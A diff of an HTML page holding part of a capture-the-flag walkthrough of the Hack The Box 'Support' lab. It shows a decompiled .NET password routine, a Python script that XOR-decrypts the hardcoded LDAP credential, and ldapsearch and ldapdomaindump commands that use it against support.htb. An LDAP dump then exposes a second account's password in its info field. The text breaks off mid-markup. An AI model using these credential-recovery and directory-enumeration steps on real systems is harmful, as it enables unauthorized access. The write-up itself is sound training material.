+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-21-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-21-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-21-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-21-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-21-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-21-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-21-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-21-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-21-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>public static string getPassword()
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a>{
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3"></a>    byte[] array = Convert.FromBase64String(enc_password);
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4"></a>    byte[] array2 = array;
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5"></a>    for (int i = 0; i &lt; array.Length; i++)
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6"></a>    {
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7"></a>        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8"></a>    }
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9"></a>    return Encoding.Default.GetString(array2);
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10"></a>}
+</span></code></pre></div></td></tr></table></div>
 <p>Here we can see the necessary steps that we will need to reverse the password if, in the end, we are able to retrieve it. Now, let's click on two function calls: "enc_password" and the private function "key".</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a># enc_password function
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>// UserInfo.Services.Protected
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>using System.Text;
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a># private static byte[] key
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>// UserInfo.Services.Protected
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>using System.Text;
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span>
+<span class="normal"><a href="#__codelineno-22-2">2</a></span>
+<span class="normal"><a href="#__codelineno-22-3">3</a></span>
+<span class="normal"><a href="#__codelineno-22-4">4</a></span>
+<span class="normal"><a href="#__codelineno-22-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a># enc_password function
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a>// UserInfo.Services.Protected
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a>using System.Text;
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5"></a>private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
+<span class="normal"><a href="#__codelineno-23-2">2</a></span>
+<span class="normal"><a href="#__codelineno-23-3">3</a></span>
+<span class="normal"><a href="#__codelineno-23-4">4</a></span>
+<span class="normal"><a href="#__codelineno-23-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a># private static byte[] key
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>// UserInfo.Services.Protected
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a>using System.Text;
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a>private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);
+</span></code></pre></div></td></tr></table></div>
 <p>With these two last elements, we can write a script to reverse the function getPassword() and ultimately obtain the password used for "support" user to access the Active Directory.</p>
 <p>Save the script as script.py and this content:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="kn">import</span> <span class="nn">base64</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">enc_password</span> <span class="o">=</span> <span class="s2">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;armando&#39;</span>
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">array</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc_password</span><span class="p">)</span>
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="n">array2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">array</span><span class="p">)):</span>
-</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>    <span class="n">array2</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span> <span class="o">^</span> <span class="mi">223</span><span class="p">)</span>
-</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>
-</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">array2</span><span class="p">)</span>
-</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="err">´´´</span>
-</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>
-</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a><span class="n">Now</span><span class="p">,</span> <span class="n">give</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span> <span class="n">execution</span> <span class="n">permissions</span> <span class="ow">and</span> <span class="n">run</span> <span class="n">it</span><span class="p">:</span>
-</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>
-</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="err">```</span><span class="n">bash</span>
-</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span>
-</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a><span class="n">python</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-24-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-24-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-24-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-24-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-24-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-24-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-24-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-24-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-24-10">10</a></span>
+<span class="normal"><a href="#__codelineno-24-11">11</a></span>
+<span class="normal"><a href="#__codelineno-24-12">12</a></span>
+<span class="normal"><a href="#__codelineno-24-13">13</a></span>
+<span class="normal"><a href="#__codelineno-24-14">14</a></span>
+<span class="normal"><a href="#__codelineno-24-15">15</a></span>
+<span class="normal"><a href="#__codelineno-24-16">16</a></span>
+<span class="normal"><a href="#__codelineno-24-17">17</a></span>
+<span class="normal"><a href="#__codelineno-24-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="kn">import</span> <span class="nn">base64</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3"></a><span class="n">enc_password</span> <span class="o">=</span> <span class="s2">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4"></a><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;armando&#39;</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5"></a>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6"></a><span class="n">array</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc_password</span><span class="p">)</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7"></a><span class="n">array2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">array</span><span class="p">)):</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9"></a>    <span class="n">array2</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span> <span class="o">^</span> <span class="mi">223</span><span class="p">)</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10"></a>
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">array2</span><span class="p">)</span>
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12"></a><span class="err">´´´</span>
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13"></a>
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14"></a><span class="n">Now</span><span class="p">,</span> <span class="n">give</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span> <span class="n">execution</span> <span class="n">permissions</span> <span class="ow">and</span> <span class="n">run</span> <span class="n">it</span><span class="p">:</span>
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15"></a>
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16"></a><span class="err">```</span><span class="n">bash</span>
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17"></a><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span>
+</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18"></a><span class="n">python</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Decrypted password would be: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</p>
 <p>Before going on, there is another way to get the password besides writing this python script. One of them, for instance, would involve:</p>
 <ol>
@@ -17474,86 +17650,137 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>ldap directory: support.htb</li>
 </ul>
 <p>Now we can use a tool such as ldapsearch to open a connection to the LDAP server, bind, and perform a search using specified parameters, like:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>-b searchbase   Use searchbase as the starting point for the search instead of the default.
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>-x      Use simple authentication instead of SASL.
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>-D binddn   Use the Distinguished Name binddn to bind to the LDAP directory.  For SASL binds, the server is expected to ignore this value.
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>-w passwd       Use passwd as the password for simple authentication.
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>-H ldapuri  Specify  URI(s)  referring  to  the  ldap  server(s); a list of URI, separated by whitespace or commas is expected
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
+<span class="normal"><a href="#__codelineno-25-2">2</a></span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span>
+<span class="normal"><a href="#__codelineno-25-4">4</a></span>
+<span class="normal"><a href="#__codelineno-25-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>-b searchbase   Use searchbase as the starting point for the search instead of the default.
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a>-x      Use simple authentication instead of SASL.
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a>-D binddn   Use the Distinguished Name binddn to bind to the LDAP directory.  For SASL binds, the server is expected to ignore this value.
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4"></a>-w passwd       Use passwd as the password for simple authentication.
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5"></a>-H ldapuri  Specify  URI(s)  referring  to  the  ldap  server(s); a list of URI, separated by whitespace or commas is expected
+</span></code></pre></div></td></tr></table></div>
 <p>Using ldapsearch, we run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># # ldapsearch -x -H ldap://$ip -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://support.htb<span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;support\ldap&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Users,DC=support,DC=htb&quot;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="c1"># # ldapsearch -x -H ldap://$ip -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://support.htb<span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;support\ldap&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Users,DC=support,DC=htb&quot;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results are long and provided in text form. By using a tool such as ldapdomaindump we can get cool results in different formats: .grep, .html, and .json.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="w"> </span>ldapdomaindump<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support\ldap&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>dc.support.htb
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="w"> </span>ldapdomaindump<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support\ldap&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>dc.support.htb
+</span></code></pre></div></td></tr></table></div>
 <p>Then, we can run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>firefox<span class="w"> </span>domain_users.html
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a>firefox<span class="w"> </span>domain_users.html
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
 <p><img alt="screenshot" src="../img/users-ldap.png" /></p>
 <p>It looks like the support user account has the most permissions. We have a closer look to this user in the results obtained in the ldapsearch:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># support, Users, support.htb
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>dn: CN=support,CN=Users,DC=support,DC=htb
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>objectClass: top
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>objectClass: person
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>objectClass: organizationalPerson
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>objectClass: user
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>cn: support
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>c: US
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>l: Chapel Hill
-</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>st: NC
-</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>postalCode: 27514
-</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>distinguishedName: CN=support,CN=Users,DC=support,DC=htb
-</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>instanceType: 4
-</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>whenCreated: 20220528111200.0Z
-</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a>whenChanged: 20221109173336.0Z
-</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>uSNCreated: 12617
-</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>info: Ironside47pleasure40Watchful
-</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
-</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a>memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
-</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>uSNChanged: 81981
-</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>company: support
-</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>streetAddress: Skipper Bowles Dr
-</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>name: support
-</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
-</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a>userAccountControl: 66048
-</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>badPwdCount: 0
-</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>codePage: 0
-</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a>countryCode: 0
-</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29" href="#__codelineno-29-29"></a>badPasswordTime: 0
-</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30" href="#__codelineno-29-30"></a>lastLogoff: 0
-</span><span id="__span-29-31"><a id="__codelineno-29-31" name="__codelineno-29-31" href="#__codelineno-29-31"></a>lastLogon: 0
-</span><span id="__span-29-32"><a id="__codelineno-29-32" name="__codelineno-29-32" href="#__codelineno-29-32"></a>pwdLastSet: 132982099209777070
-</span><span id="__span-29-33"><a id="__codelineno-29-33" name="__codelineno-29-33" href="#__codelineno-29-33"></a>primaryGroupID: 513
-</span><span id="__span-29-34"><a id="__codelineno-29-34" name="__codelineno-29-34" href="#__codelineno-29-34"></a>objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
-</span><span id="__span-29-35"><a id="__codelineno-29-35" name="__codelineno-29-35" href="#__codelineno-29-35"></a>accountExpires: 9223372036854775807
-</span><span id="__span-29-36"><a id="__codelineno-29-36" name="__codelineno-29-36" href="#__codelineno-29-36"></a>logonCount: 0
-</span><span id="__span-29-37"><a id="__codelineno-29-37" name="__codelineno-29-37" href="#__codelineno-29-37"></a>sAMAccountName: support
-</span><span id="__span-29-38"><a id="__codelineno-29-38" name="__codelineno-29-38" href="#__codelineno-29-38"></a>sAMAccountType: 805306368
-</span><span id="__span-29-39"><a id="__codelineno-29-39" name="__codelineno-29-39" href="#__codelineno-29-39"></a>objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
-</span><span id="__span-29-40"><a id="__codelineno-29-40" name="__codelineno-29-40" href="#__codelineno-29-40"></a>dSCorePropagationData: 20220528111201.0Z
-</span><span id="__span-29-41"><a id="__codelineno-29-41" name="__codelineno-29-41" href="#__codelineno-29-41"></a>dSCorePropagationData: 16010101000000.0Z
-</span><span id="__span-29-42"><a id="__codelineno-29-42" name="__codelineno-29-42" href="#__codelineno-29-42"></a>lastLogonTimestamp: 133124888166969633
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-29-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-29-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-29-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-29-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-29-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-29-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-29-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-29-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-29-10">10</a></span>
+<span class="normal"><a href="#__codelineno-29-11">11</a></span>
+<span class="normal"><a href="#__codelineno-29-12">12</a></span>
+<span class="normal"><a href="#__codelineno-29-13">13</a></span>
+<span class="normal"><a href="#__codelineno-29-14">14</a></span>
+<span class="normal"><a href="#__codelineno-29-15">15</a></span>
+<span class="normal"><a href="#__codelineno-29-16">16</a></span>
+<span class="normal"><a href="#__codelineno-29-17">17</a></span>
+<span class="normal"><a href="#__codelineno-29-18">18</a></span>
+<span class="normal"><a href="#__codelineno-29-19">19</a></span>
+<span class="normal"><a href="#__codelineno-29-20">20</a></span>
+<span class="normal"><a href="#__codelineno-29-21">21</a></span>
+<span class="normal"><a href="#__codelineno-29-22">22</a></span>
+<span class="normal"><a href="#__codelineno-29-23">23</a></span>
+<span class="normal"><a href="#__codelineno-29-24">24</a></span>
+<span class="normal"><a href="#__codelineno-29-25">25</a></span>
+<span class="normal"><a href="#__codelineno-29-26">26</a></span>
+<span class="normal"><a href="#__codelineno-29-27">27</a></span>
+<span class="normal"><a href="#__codelineno-29-28">28</a></span>
+<span class="normal"><a href="#__codelineno-29-29">29</a></span>
+<span class="normal"><a href="#__codelineno-29-30">30</a></span>
+<span class="normal"><a href="#__codelineno-29-31">31</a></span>
+<span class="normal"><a href="#__codelineno-29-32">32</a></span>
+<span class="normal"><a href="#__codelineno-29-33">33</a></span>
+<span class="normal"><a href="#__codelineno-29-34">34</a></span>
+<span class="normal"><a href="#__codelineno-29-35">35</a></span>
+<span class="normal"><a href="#__codelineno-29-36">36</a></span>
+<span class="normal"><a href="#__codelineno-29-37">37</a></span>
+<span class="normal"><a href="#__codelineno-29-38">38</a></span>
+<span class="normal"><a href="#__codelineno-29-39">39</a></span>
+<span class="normal"><a href="#__codelineno-29-40">40</a></span>
